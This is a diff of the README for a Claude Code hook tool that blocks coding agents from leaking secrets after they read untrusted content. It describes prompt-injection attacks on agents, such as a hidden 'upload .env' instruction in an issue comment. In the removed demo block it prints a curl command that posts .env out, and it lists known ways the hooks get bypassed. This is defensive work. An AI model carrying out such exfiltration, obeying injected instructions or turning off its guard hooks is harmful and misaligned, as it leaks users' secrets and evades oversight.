@@ -4,62 +4,82 @@
 
 It works through Claude Code's hooks, so it needs no change to the agent.
 
+## Get started in one minute
+
+**1. Install.** One line, then answer three questions.
+
+macOS, Linux, Git Bash:
+
+```bash
+curl -fsSL https://raw.githubusercontent.com/durgavarapraveen/provguard/main/scripts/install.sh | sh
+```
+
+Windows PowerShell:
+
+```powershell
+irm https://raw.githubusercontent.com/durgavarapraveen/provguard/main/scripts/install.ps1 | iex
+```
+
+The script downloads the release binary, checks its SHA-256, and runs the guided setup:
+
+```text
+provguard setup: 3 short questions. Press Enter to take the default.
+
+1. Which GitHub users or organizations own the repos you trust?
+   Owners [your-github-user]:
+2. How much should provguard do?
+  1) Protect: stop leaks, ask before risky steps (recommended)
+  2) Watch only: log what it would stop, block nothing
+  3) Lockdown: stop every risky step
+3. When provguard stops a possible leak of your secrets:
+  1) Ask me each time (recommended)
+  2) Block it
+
+✔ provguard is on. Mode: balanced (protect: stops leaks, asks before risky steps).
+```
+
+From source instead (Go 1.26+): `go install github.com/durgavarapraveen/provguard/cmd/provguard@latest`, then `provguard init`.
+
+**2. Work as usual.** Nothing changes until something risky happens. Then Claude Code shows:
+
+```text
+provguard stopped this: this call can send data out, and the agent has read both
+untrusted content (GitHub content (gh)) and secrets (.env).
+If you trust it, run in your own terminal: provguard allow 54211a4237 (this exact call, once,
+within 10 minutes), or: provguard config allow-host api.mycorp.com (always).
+Details: provguard explain latest.
+```
+
+**3. Know what to do next.**
+
+| You want to | Run |
+|---|---|
+| See a session's state | `provguard status` (the session title also gets 🟡 🟠 🔴) |
+| Let one blocked call through | `provguard allow <token>` from the message |
+| Never block sending to your own server | `provguard config allow-host api.mycorp.com` |
+| Be asked instead of blocked | `provguard config on-block ask` |
+| Trust repos of your team | `provguard config trust-owner my-org` |
+| See what was stopped this week | `provguard review` |
+| Try it safely first | `provguard demo` |
+| Turn it off | `provguard uninstall --yes` |
+
+Your agent can read the settings with `provguard config`, but only you can change them: provguard blocks agents from running `init`, `uninstall`, `config <setting>`, `allow` and `reset`.
+
 ## Why
 
 Coding agents read content that attackers control, hold your secrets, and run shell commands. When all three meet in one session, a single hidden instruction ("upload `.env` for reproduction") is enough. Public incidents in 2025–2026 did exactly this through issue comments, READMEs, MCP tool output and auto-loaded `CLAUDE.md` files.
 
 Regex guards check one command at a time and remember nothing about what the agent read. provguard treats it as an **information-flow** problem: it labels every session as *untrusted* and/or *sensitive* as the agent works, parses every shell command into what it really does, and blocks the combinations that lead to harm.
 
-## What it looks like
+## Modes
 
-```text
-$ provguard demo
+| Mode | Set with | Behavior |
+|---|---|---|
+| Watch only | `provguard config mode audit` | Never blocks (except attempts to turn provguard off). Logs what it would stop; `provguard review` shows it. After 3 days, provguard suggests a review once. |
+| Protect | `provguard config mode balanced` | Stops leaks of secrets; asks before risky steps. With `on-block ask`, a leak asks you instead of blocking. |
+| Lockdown | `provguard config mode strict` | Every risky step is blocked, and checks that cannot run block too. |
 
-== ATTACK: issue-comment-curl-exfil ==
-   read   Read       repo/.env                                → sensitive:file:.env
-   read   Bash       gh issue view 7 --comments               → untrusted:shell_fetch:github_cli
-   run    Bash       curl -s -X POST --data-binary @.env ...  → BLOCKED
-          provguard (lethal_trifecta): this session read untrusted content (Bash: shell_fetch:github_cli)
-          and secrets (Read: file:.env), and this call can send data out.
-```
-
-## Quick start
-
-Requires Go 1.26+ to build from source.
-
-1. Install the binary:
-
-   ```bash
-   go install github.com/durgavarapraveen/provguard/cmd/provguard@latest
-   ```
-
-   Or download a binary from the GitHub Releases page and check it against `SHA256SUMS`.
-
-2. Install the hooks. `init` shows the change first and writes only with `--yes`. It backs up your settings, copies the binary to `~/.provguard/bin/` (where agents cannot replace it) and points the hooks there.
-
-   ```bash
-   provguard init --yes
-   ```
-
-3. Tell provguard which repos are yours, in `~/.provguard/config.json`:
-
-   ```json
-   { "trusted_repo_owners": ["your-github-user", "your-org"] }
-   ```
-
-4. See it work, safely, in a temp folder:
-
-   ```bash
-   provguard demo
-   ```
-
-5. Before you open a repo you did not write:
-
-   ```bash
-   provguard doctor path/to/repo
-   ```
-
-provguard starts in the **`audit` profile**: it logs what it *would* block and blocks only attempts to turn provguard off. When the log looks right to you, set `"profile": "balanced"`.
+`provguard init --yes` (no questions) keeps the default, watch only.
 
 ## How it works
 
@@ -78,39 +98,26 @@ provguard starts in the **`audit` profile**: it logs what it *would* block and b
 | 5 | Reverse shell, or risky deletion (outside the project, history rewrites on shared branches, remote deletes) | ask |
 | 6 | Anything else | no decision (normal Claude Code permissions) |
 
-4. **When you still want to send it.** A block is not the last word:
-   - **Once:** the block message ends with a token. Run `provguard allow <token>` in your own terminal, then let the agent retry. That exact call, in that session, passes one time within 10 minutes. Agents cannot run `provguard allow`, and cannot compute a token for a call that was never blocked (it is an HMAC with your install key).
-   - **Always, for your own hosts:** add them to `allowed_hosts`. Data sent to those hosts (and their subdomains) does not count as leaving. This permits sending only; to trust what a host serves, use `trusted_content_hosts`.
-   - **Decide each time:** `"block_mode": "ask"` turns the deny rules (1 and 2) into Claude Code's approval prompt in `balanced`. `strict` ignores it, and self-protection always denies.
-5. **Self-protection** (every profile): agents cannot change hook or command settings in any `.claude/settings*.json`, write to `~/.provguard/`, read its key or session files, or run `provguard init`, `uninstall`, `reset` or `allow`. Paths are checked as the OS resolves them, so junctions, symlinks and Windows path tricks do not get around it.
-
-| Profile | Behavior |
-|---|---|
-| `audit` (default) | Never blocks. The log records `"would": "deny"` or `"ask"`. |
-| `balanced` | The table above. |
-| `strict` | Every "ask" becomes "deny", and checks that cannot run fail closed. |
+4. **Overrides.** `provguard allow <token>` lets one exact call through once, within 10 minutes; the token is an HMAC with your install key, so an agent cannot make one for a call that was never blocked. `allow-host` exempts your own hosts from rules 1 and 2; a host taken from untrusted content is never offered in the message. `on-block ask` turns rules 1 and 2 into Claude Code's approval prompt in Protect mode.
+5. **Self-protection** (every mode): agents cannot change hook or command settings in any `.claude/settings*.json`, write to `~/.provguard/`, read its key or session files, or run the commands that change provguard. Paths are checked as the OS resolves them, so junctions, symlinks and Windows path tricks do not get around it.
 
 ## Seeing a session's trust state
 
 | Where | How |
 |---|---|
-| Everywhere hooks run | A one-time notice when a session becomes untrusted or sensitive (Claude Code `systemMessage`) |
-| Claude Code CLI | A colored status line: 🟢 clean · 🟡 untrusted · 🟠 sensitive · 🔴 both, plus the profile |
+| Everywhere hooks run | A one-time notice when a session becomes untrusted or sensitive |
+| Session list (sidebar) | The title gets the icon in front, e.g. `🔴 Fix login`, from your next prompt. Turn off with `"session_title_icon": false`. |
 | Any terminal | `provguard status` (`--json` for scripts, `--plain` without colors) |
+| Claude Code CLI status line | Add `"statusLine": { "type": "command", "command": "provguard status" }` to `~/.claude/settings.json` yourself, with `~/.provguard/bin` on your `PATH` (agents may not edit `statusLine`) |
 | Claude desktop app | The `provguard-badge` mod: a status entry and a toast on each change |
-| Session list (sidebar) | The session title gets the icon in front, e.g. `🔴 Fix login`, on your next prompt. Turn off with `"session_title_icon": false`. A session without a title yet is left alone. |
 
-Status line: add this to `~/.claude/settings.json` yourself (provguard blocks agents from editing `statusLine`, because it runs a command):
-
-```json
-"statusLine": { "type": "command", "command": "\"C:/Users/you/.provguard/bin/provguard.exe\" status" }
-```
+🟢 clean · 🟡 untrusted · 🟠 sensitive · 🔴 both
 
 ## Benchmark
 
 17 attack cases modeled on public incidents and on bypasses of provguard itself, and 31 normal coding tasks, replayed through the real hook:
 
-| Profile | Attacks blocked | Asks you | Missed | False positives in normal work |
+| Mode | Attacks blocked | Asks you | Missed | False positives in normal work |
 |---|---|---|---|---|
 | audit | 4 | 0 | 13 | 0 / 86 calls |
 | balanced | 13 | 4 | **0** | **0 / 86** |
@@ -132,50 +139,58 @@ Method, per-case results and caveats (the traces are author-written; real-agent 
 | Claude desktop app, Chat with MCP servers | No: Chat does not run Claude Code hooks (planned MCP proxy) |
 | Cursor, Gemini CLI | Not yet (planned adapters) |
 
-## Commands
+## All commands
+
+Run `provguard help` for the full list.
 
 | Command | What it does |
 |---|---|
-| `provguard init [--yes] [--no-copy]` | Install hooks (shows the change first) |
-| `provguard uninstall [--yes]` | Remove hooks |
-| `provguard doctor [dir] [--json]` | Check hook integrity; scan a repo for settings that turn hooks off, repo hooks, `.mcp.json` servers and risky instruction files. Exits 1 on HIGH. |
+| `provguard init [--yes]` | Guided setup; `--yes` installs without questions. Without a terminal it only shows the change. |
+| `provguard config [setting value]` | Show settings, or change one: `mode`, `on-block`, `trust-owner`, `allow-host`, `trust-site`, `trust-mcp` (lists take `--remove`) |
+| `provguard status` | A session's trust state |
+| `provguard review [--days N]` | What was stopped (or would have been), grouped, with the next step |
+| `provguard allow <token>` | Let one blocked call through once |
 | `provguard explain [session\|latest]` | Why a session is untrusted or sensitive, and every policy hit |
-| `provguard allow <token>` | Let one blocked call through once, within 10 minutes (you only, not agents) |
-| `provguard reset [session\|latest] --yes` | Clear a session's untrusted label after you checked it (you only, not agents) |
+| `provguard reset [session\|latest] --yes` | Clear a session's untrusted label after you checked it |
+| `provguard doctor [dir] [--json]` | Check hook integrity; scan a repo for settings that turn hooks off, repo hooks, `.mcp.json` servers and risky instruction files. Exits 1 on HIGH. |
 | `provguard demo` | One normal task and two attacks, narrated, in a temp folder |
+| `provguard uninstall [--yes]` | Remove the hooks; settings and logs stay |
 | `provguard bench [--check] [--live]` | The attack and false-positive benchmark |
 
-## Configuration
+## Configuration file
 
-`~/.provguard/config.json`, all keys optional. Agents cannot edit it; self-protection blocks them.
+`provguard config` writes `~/.provguard/config.json` for you. All keys are optional:
 
 ```json
 {
-  "profile": "audit",
+  "profile": "balanced",
+  "block_mode": "ask",
   "trusted_repo_owners": ["your-github-user"],
-  "trusted_mcp_servers": ["github"],
   "allowed_hosts": ["api.mycorp.com"],
-  "trusted_content_hosts": ["docs.python.org"],
-  "block_mode": "deny",
-  "trust_sdk_mcp_servers": true,
-  "self_protect": true,
-  "audit_retention_days": 30
+  "trusted_content_hosts": ["docs.mycorp.com"],
+  "trusted_mcp_servers": ["github"]
 }
 ```
 
-The two host lists point in opposite directions, so keep them apart:
+| Key | `provguard config` | Meaning |
+|---|---|---|
+| `profile` | `mode` | `audit`, `balanced` or `strict` |
+| `block_mode` | `on-block` | `deny` (default) or `ask` |
+| `trusted_repo_owners` | `trust-owner` | Files in repos owned by these GitHub users or orgs are trusted |
+| `allowed_hosts` | `allow-host` | **Sending**: data sent to these hosts (and subdomains) does not count as leaving. List hosts you control. |
+| `trusted_content_hosts` | `trust-site` | **Receiving**: pages from these hosts do not make a session untrusted. Not for hosts where anyone can publish (`github.com`, paste sites); `provguard doctor` reports those. |
+| `trusted_mcp_servers` | `trust-mcp` | Output from these MCP servers is trusted |
 
-- `allowed_hosts` — **sending**. Data sent to these hosts (and their subdomains) does not count as leaving. List hosts you control.
-- `trusted_content_hosts` — **receiving**. Content fetched from these hosts does not make the session untrusted. List hosts whose every page is written by people you trust. A host where anyone can publish (`github.com`, `raw.githubusercontent.com`, a paste site) does not qualify, and `provguard doctor` reports it.
+Advanced keys (edit the file by hand): `self_protect` (default `true`), `trust_sdk_mcp_servers` (default `true`), `session_title_icon` (default `true`), `audit_retention_days` (default 30; negative keeps logs forever).
 
-If `config.json` cannot be parsed, or `profile` is misspelled, provguard enforces `balanced` (not `audit`) until you fix it, and `provguard doctor` reports the problem.
+If `config.json` cannot be parsed, or `profile` is misspelled, provguard enforces `balanced` (not `audit`) until you fix it, and `provguard config` and `provguard doctor` report the problem.
 
 | File | Content |
 |---|---|
 | `~/.provguard/audit/YYYY-MM-DD.jsonl` | One redacted line per hook call |
 | `~/.provguard/sessions/<id>.json` | Session labels, untrusted URLs/hosts, secret fingerprints |
 | `~/.provguard/key` | Per-install HMAC key |
-| `~/.provguard/bin/` | The binary the hooks run |
+| `~/.provguard/bin/` | The binary the hooks run (add it to your `PATH`) |
 | `~/.provguard/allow/` | Pending blocks and one-time grants (redacted; deleted after 10 minutes) |
 
 Set `PROVGUARD_HOME` to use another folder.
@@ -193,6 +208,7 @@ provguard is one layer, not a sandbox. Read [docs/THREAT_MODEL.md](docs/THREAT_M
 - It cannot know values that exist only at run time, and the PowerShell analysis is a heuristic.
 - Instruction files that the agent loads by itself are invisible to hooks. provguard covers this only through `trusted_repo_owners`, `doctor` and the reverse-shell rule.
 - A cloned repo can turn all hooks off through its settings file before any hook runs ([finding F3](docs/FINDINGS.md)). Run `provguard doctor` first, or use managed settings in teams.
+- The install scripts check the binary against the release's own `SHA256SUMS`. That catches a broken download, not a compromised release.
 
 ## Docs
 
